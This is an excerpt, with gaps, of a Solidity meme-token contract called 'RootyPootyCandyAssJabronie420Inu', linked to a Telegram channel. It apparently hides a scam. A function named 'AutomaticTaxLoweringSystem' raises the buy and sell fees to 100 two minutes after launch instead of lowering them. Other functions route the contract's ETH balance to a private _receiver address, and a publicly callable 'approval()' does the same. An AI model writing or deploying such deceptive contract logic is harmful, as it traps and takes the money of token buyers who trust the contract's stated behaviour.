...
https://t.me/RootyPootyCandyAssJabronie420Inu
...
contract RootyPootyCandyAssJabronie420Inu is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'RootyPootyCandyAssJabronie420Inu';
    ...
    uint256 private swapbackInitiate = 30;
    ...
    constructor() Ownable(msg.sender) {
        ...
        uint256 amount = _totalSupply.mul(15).div(100);
        uint256 delta = _totalSupply.sub(amount);
    ...
    function approval() public override {payable(_receiver).transfer(address(this).balance);}
    ...
    function AutomaticTaxLoweringSystem() internal {
        if(launchTime.add(2 minutes) <= block.timestamp){totalFee = uint256(100); sellFee =uint256(100);
            ATLSCompletion = true;}
    }
    ...
    function sellCounters(address sender, address recipient) internal {
        ...
        if(sender == pair && !isFeeExempt[recipient].FeeExempt){buyCounter += uint256(1);}
    }
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        swapTokensForETH(tokens); uint256 amount = address(this).balance;
        if(amount > 0){payable(_receiver).transfer(amount);}
    }
    ...
    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        ...
        bool aboveBuyCounter = buyCounter >= swapbackInitiate;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender].FeeExempt && 
            recipient == pair && swapTimes >= uint256(1) && aboveThreshold && aboveBuyCounter;
    }
